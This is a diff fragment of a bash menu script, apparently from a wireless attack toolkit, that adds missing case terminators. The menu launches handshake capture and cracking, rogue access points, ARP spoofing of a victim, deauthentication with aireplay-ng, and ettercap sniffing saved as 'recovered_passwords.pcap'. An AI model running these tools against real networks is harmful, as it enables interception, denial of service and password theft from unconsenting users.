@@ -75,11 +75,11 @@ menu()
         echo "Any bash command"
     elif [[ $CHOICE =~ ^[0-9]+$ ]]; then
 	case $CHOICE in
-	    0) killemAll $FAILSAFE
-	    1) sudo $EDITOR ${DIR_CONF}n4p.conf
-	    2) sudo xterm -bg black -fg DodgerBlue1 -T "Recon" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./recon ; bash\"" &>/dev/null &
-	    3) [[ $ATTACK == "WPS" ]] && sudo xterm -bg black -fg DodgerBlue1 -T "Wash" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./wash ; bash\"" &>/dev/null & || sudo xterm -bg black -fg DodgerBlue1 -T "Dump cap" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./dump ; bash\"" &>/dev/null &
-	    4) sudo xterm -bg black -fg DodgerBlue1 -T "Cracking" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./cracking ; bash\"" &>/dev/null &
+	    0) killemAll $FAILSAFE ;;
+	    1) sudo $EDITOR ${DIR_CONF}n4p.conf ;;
+	    2) sudo xterm -bg black -fg DodgerBlue1 -T "Recon" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./recon ; bash\"" &>/dev/null & ;;
+	    3) [[ $ATTACK == "WPS" ]] && sudo xterm -bg black -fg DodgerBlue1 -T "Wash" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./wash ; bash\"" &>/dev/null & || sudo xterm -bg black -fg DodgerBlue1 -T "Dump cap" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./dump ; bash\"" &>/dev/null & ;;
+	    4) sudo xterm -bg black -fg DodgerBlue1 -T "Cracking" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./cracking ; bash\"" &>/dev/null & ;;
 	    5) if [[ $ATTACK == "Handshake" || $ATTACK == "Karma" || -z $ATTACK ]]; then
 		  sudo xterm -bg black -fg DodgerBlue1 -T "Airbase" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./airbase ; bash\"" &>/dev/null &
 	       elif [[ $ATTACK == "WPS" ]]; then
@@ -93,8 +93,9 @@ menu()
 	       elif [[ $ATTACK == "ArpSpoof" ]]; then
 		  sudo xterm -bg black -fg DodgerBlue1 -T "ArpSpoof" -geometry 90x20 -e "bash -ic \"arpspoof -i $IFACE1 $ARP_VICTIM ; bash\"" &>/dev/null & #sudo xterm -T "Arpspoof $IFACE1 $AP_GATEWAY" -geometry 90x15 -e arpspoof -i $IFACE1 $ARP_VICTIM &>/dev/null &
 	      fi
-	     6) sudo xterm -bg black -fg DodgerBlue1 -T "iptables" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./firewall ; bash\"" &>/dev/null &
-	     7) sudo xtemr -bg black -fg DodgerBlue1 -T "Aireplay" -geometry 90x20 -e "bash -ic \"aireplay-ng --deauth 1 -a $VICTIM_BSSID -c $STATION ${IFACE1}mon ; bash\"" &>/dev/null &
+	      ;;
+	     6) sudo xterm -bg black -fg DodgerBlue1 -T "iptables" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./firewall ; bash\"" &>/dev/null & ;;
+	     7) sudo xtemr -bg black -fg DodgerBlue1 -T "Aireplay" -geometry 90x20 -e "bash -ic \"aireplay-ng --deauth 1 -a $VICTIM_BSSID -c $STATION ${IFACE1}mon ; bash\"" &>/dev/null & ;;
 	     8) [[ ! -f ${SESSIONFOLDER}recovered_passwords.pcap ]] && sudo touch ${SESSIONFOLDER}recovered_passwords.pcap
 		if [[ $BRIDGED == "True" ]]; then
 		  sudo xterm -bg black -fg DodgerBlue1 -T "ettercap" -geometry 90x20 -e "bash -ic \"ettercap ${ETTERCAP_OPTIONS} -i ${BR_NAME} ; bash\"" &>/dev/null &
@@ -103,6 +104,7 @@ menu()
 		elif [[ $AP_NAME == "HOSTAPD" ]]; then
 		  sudo xterm -bg black -fg DodgerBlue1 -T "ettercap $IFACE1" -geometry 90x20 -e "bash -ic \"ettercap $ETTERCAP_OPTIONS -i $IFACE1 -w ${SESSIONFOLDER}recovered_passwords.pcap ; bash\"" &>/dev/null &
 		fi
+		;;
 	esac
     else
         ###########################################################################################################################
